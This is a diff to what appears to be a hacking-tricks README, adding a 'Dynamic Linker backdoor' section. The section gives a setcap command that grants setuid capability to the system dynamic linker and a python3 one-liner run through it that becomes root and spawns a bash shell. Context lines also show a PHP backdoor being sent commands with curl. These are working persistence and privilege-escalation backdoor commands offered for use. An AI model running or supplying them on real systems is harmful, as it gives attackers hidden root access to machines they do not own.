@@ -55,6 +55,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [authorized_keys](#backdoor-auth-keys)
    1. [Remote access an entire network](#backdoor-network)
    1. [Smallest PHP backdoor](#carriage-return-backdoor) 
+   1. [Dynamic Linker backdoor](#ld-backdoor)
 1. [Shell Hacks](#shell-hacks)
    1. [Shred files (secure delete)](#shred)
    1. [Restore the date of a file](#restore-timestamp)
@@ -1098,6 +1099,18 @@ cd /var/www/html && php -S 127.0.0.1:8080
 curl http://127.0.0.1:8080/test.php
 ### With executing a command
 curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
+```
+
+<a id="ld-backdoor"></a>
+**6.v. Dynamic Linker Backdoor**
+
+Give the setuid capability to the dynamic linker:
+```bash
+sudo setcap cap_setuid+ep /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+```
+Then to become root:
+```bash
+/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
 ```
 
 ---
